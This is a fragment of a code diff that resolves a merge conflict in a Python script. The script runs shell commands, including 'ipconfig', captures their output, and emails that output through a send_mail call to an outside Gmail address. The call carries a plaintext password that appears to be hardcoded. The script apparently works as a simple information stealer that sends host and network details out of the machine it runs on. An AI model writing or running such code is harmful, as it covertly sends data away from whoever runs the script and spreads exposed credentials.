@@ -36,12 +36,11 @@ result1 = subprocess.check_output(command, shell=True)
 command = "ipconfig"
 result2 = subprocess.check_output(command, shell=True)
 
-<<<<<<< HEAD
 
 send_mail("captianlastimosa@gmail.com", "", result1)
-=======
+
 send_mail("captianlastimosa@gmail.com", "wither14", result1)
->>>>>>> 96ff84aa11b73677e7d2ea2a560dc3ea1ff0e813
+
 
 send_mail("captianlastimosa@gmail.com", "wither14", result2)
 
